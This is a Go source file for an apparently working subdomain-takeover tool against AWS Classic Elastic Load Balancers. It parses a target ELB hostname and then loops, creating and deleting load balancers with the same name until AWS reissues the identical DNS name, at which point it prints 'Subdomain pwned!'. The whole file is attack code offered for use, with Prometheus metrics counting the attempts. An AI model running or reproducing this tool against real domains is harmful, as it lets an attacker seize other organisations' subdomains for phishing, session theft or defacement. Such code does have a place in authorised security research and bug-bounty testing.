package main

import (
	"flag"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"time"

	log "github.com/sirupsen/logrus"
	// AWS libraries
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/elb"

	// Custom metrics require prom libraries
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

func main() {
	// serve metrics on 2112
	http.Handle("/metrics", promhttp.Handler())
	go func() {
		http.ListenAndServe(":2112", nil)
	}()

	// CLI flags
	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
	accountPtr := flag.Bool("accountpool", false, "should we use the account Pool from vault")
	vaultAddressPtr := flag.String("vault", "", "the address of vault to use")

	// Parse flags
	flag.Parse()
	// We need the vault address if the accountPooling is set to true
	if *accountPtr == true && *vaultAddressPtr == "" {
		log.Fatal("You have to specify the vault address if account pooling is enabled")
	}
	log.Info(*elbPtr)
	if *elbPtr == "" {
		log.Fatal("You have to Specify the ELB")
	}
	if CreateDestroyLoop(elbPtr) == true {
		fmt.Println("Found match!")
		fmt.Println("ELB created!")
		fmt.Println("Subdomain pwned!")
	}
}

func CreateDestroyLoop(elbPtr *string) bool {
	// Declaring different metrics
	// Total number of ELBs created
	var (
		elbCreated = promauto.NewCounter(prometheus.CounterOpts{
			Name: "elb_subdomain_taker_elbs_created_total",
			Help: "The total number of ELBs created",
		})
	)
	// Total number of ELBs deleted
	var (
		elbDeleted = promauto.NewCounter(prometheus.CounterOpts{
			Name: "elb_subdomain_taker_elbs_deleted_total",
			Help: "The total number of ELBs deleted",
		})
	)
	// Value of random number in elb
	var (
		elbRandomNumber = promauto.NewGauge(prometheus.GaugeOpts{
			Name: "elb_subdomain_taker_elb_random_number",
			Help: "The random number generated for the new ELBs by AWS",
		})
	)

	// We're using `MustCompile` so we fail hard if something's wrong with the regex
	/*
	   Define regex to match the "random" part of the ELB
	              This will match any random string between 6 and 10 digits enclosed between `-` and `.`
	*/
	reNum := regexp.MustCompile(`-(\d{5,10})\.`)
	// Get the "random" number from the elb
	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[1])

	log.Debug(NumToFind)

	/* All AWS Regions we're matching
	   us-east-2
	   us-east-1
	   us-west-1
	   us-west-2
	   ap-east-1
	   ap-south-1
	   ap-northeast-2
	   ap-southeast-1
	   ap-southeast-2
	   ap-northeast-1
	   ca-central-1
	   cn-north-1
	   cn-northwest-1
	   eu-central-1
	   eu-west-1
	   eu-west-2
	   eu-west-3
	   eu-north-1
	   sa-east-1
	   us-gov-east-1
	*/
	// Define the regex to match the region
	reRegion := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
	// Get the region of the ELB
	elbRegion := string(reRegion.FindStringSubmatch(*elbPtr)[0])

	log.Debug(elbRegion)

	// Get the "name" of the ELB that we'll be using to create new ELBs
	// Define the regex
	reName := regexp.MustCompile(`^(.*)-\d{6,10}\.`)
	// Get the name
	elbName := string(reName.FindStringSubmatch(*elbPtr)[1])

	log.Debug(elbName)

	// Now that we have what we're looking for, let's start to create ELBs

	// Initialise AWS session including the region we extracted from the ELB
	sess, err := session.NewSession(&aws.Config{
		Region: aws.String(elbRegion)},
	)
	if err != nil {
		log.Fatal("Could not initiate session")
	}

	// Create ELB service client
	svc := elb.New(sess)

	// Loop through creation until we found it
	for {
		// initialise empty var so we can loop
		result := &elb.CreateLoadBalancerOutput{}
		// Now start to create a new ELB
		// reference: https://docs.aws.amazon.com/sdk-for-go/api/service/elb/#ELB.CreateLoadBalancer
		log.Info("Creating ELB")
		input := &elb.CreateLoadBalancerInput{
			AvailabilityZones: []*string{
				aws.String(elbRegion + "a"),
			},
			Listeners: []*elb.Listener{
				{
					InstancePort:     aws.Int64(80),
					InstanceProtocol: aws.String("HTTP"),
					LoadBalancerPort: aws.Int64(80),
					Protocol:         aws.String("HTTP"),
				},
			},
			LoadBalancerName: aws.String(elbName),
		}

		result, err := svc.CreateLoadBalancer(input)
		if err != nil {
			if aerr, ok := err.(awserr.Error); ok {
				switch aerr.Code() {
				case elb.ErrCodeDuplicateAccessPointNameException:
					log.Warning(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
				case elb.ErrCodeTooManyAccessPointsException:
					log.Warning(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
				case elb.ErrCodeCertificateNotFoundException:
					log.Warning(elb.ErrCodeCertificateNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidConfigurationRequestException:
					log.Warning(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
				case elb.ErrCodeSubnetNotFoundException:
					log.Warning(elb.ErrCodeSubnetNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidSubnetException:
					log.Warning(elb.ErrCodeInvalidSubnetException, aerr.Error())
				case elb.ErrCodeInvalidSecurityGroupException:
					log.Warning(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
				case elb.ErrCodeInvalidSchemeException:
					log.Warning(elb.ErrCodeInvalidSchemeException, aerr.Error())
				case elb.ErrCodeTooManyTagsException:
					log.Warning(elb.ErrCodeTooManyTagsException, aerr.Error())
				case elb.ErrCodeDuplicateTagKeysException:
					log.Warning(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
				case elb.ErrCodeUnsupportedProtocolException:
					log.Warning(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
				case elb.ErrCodeOperationNotPermittedException:
					log.Warning(elb.ErrCodeOperationNotPermittedException, aerr.Error())
				default:
					log.Warning(aerr.Error())
				}
			} else {
				// Print the error, cast err to awserr.Error to get the Code and
				// Message from an error.
				log.Warning(err.Error())
			}
			// We don't want to return if we have an error, just try again
			// return false
		}
		// Increase elbCreated counter
		elbCreated.Inc()
		log.Info(result)
		randomNumberNew, err := strconv.ParseFloat(reNum.FindStringSubmatch(*result.DNSName)[1], 64)
		if err != nil {
			log.Warning(err)
		}
		elbRandomNumber.Set(randomNumberNew)
		if *result.DNSName == *elbPtr {
			return true
		}
		// if we have an ELB at this point, we need to delete it to not pile them up
		if *result.DNSName != "" {
			log.Info("Deleting current ELB:" + *result.DNSName)
			input := &elb.DeleteLoadBalancerInput{
				LoadBalancerName: aws.String(elbName),
			}

			_, err := svc.DeleteLoadBalancer(input)
			if err != nil {
				if aerr, ok := err.(awserr.Error); ok {
					switch aerr.Code() {
					default:
						log.Error(aerr.Error())
					}
				} else {
					// Print the error, cast err to awserr.Error to get the Code and
					// Message from an error.
					log.Error(err.Error())
				}
			}
			// Increase elbDeleted counter if there are no errors and print message
			if err == nil {
				elbDeleted.Inc()
				log.Info("Deleted existing ELB successfully")
			}
		}
		log.Debug("Sleeping before we try again to avoid the rate limit")
		time.Sleep(2000 * time.Millisecond)
		log.Debug("Next try")
	}
}
